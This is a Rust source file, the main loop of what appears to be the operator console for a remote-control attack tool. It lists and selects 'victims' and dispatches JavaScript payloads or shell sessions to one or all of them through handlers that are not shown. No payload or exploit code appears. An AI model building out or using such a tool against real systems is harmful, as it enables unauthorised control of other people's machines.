/*
 * Copyright (C) 2021  Aravinth Manivannan <realaravinth@batsense.net>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
use std::error::Error;
use std::io::stdout;
use std::io::Write;

use clap::Clap;

use cli::handlers::*;
use cli::{commands::Commands, options::Options, Mode, State};

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let options = Options::parse();
    let stdout = stdout(); // get the global stdout entity
    let mut s = State::new(stdout, &options).await?;

    let mut input = String::new();
    s.welcome()?;
    s.refresh_victims().await?;
    s.list_victims()?;
    let cmd = s.mode.clone().print_and_read(&mut s, &mut input)?;

    loop {
        match s.mode {
            Mode::Default => {
                s.list_victims()?;

                if cmd == Commands::SelectVictim {
                    s.select_victim(&mut input)?;
                    let cmd = s.mode.clone().print_and_read(&mut s, &mut input)?;
                    if cmd == Commands::JavaScript {
                        javascript(&mut s).await?;
                    }
                } else if cmd == Commands::MultipleVictims {
                    s.refresh_victims().await?;
                    write!(s.write, "Targetting all victims")?;
                    s.write.flush()?;

                    // select payload
                    let cmd = s.mode.clone().print_and_read(&mut s, &mut input)?;
                    if cmd == Commands::JavaScript {
                        javascript(&mut s).await?;
                    } else if cmd == Commands::Shell {
                    }
                }
            }
            Mode::Shell => {
                shell(&mut s, &mut input).await?;
            }
            Mode::TargetAll => loop {
                s.refresh_victims().await?;
                writeln!(s.write, "Targetting all victims")?;
                let cmd = s.mode.clone().print_and_read(&mut s, &mut input)?;
                if cmd == Commands::JavaScript {
                    javascript(&mut s).await?;
                } else if cmd == Commands::Shell {
                    shell(&mut s, &mut input).await?;
                    break;
                } else if s.mode == Mode::Exit {
                    break;
                }
            },
            Mode::Exit => {
                println!("Bye!");
                break;
            }
        };
    }

    Ok(())
}
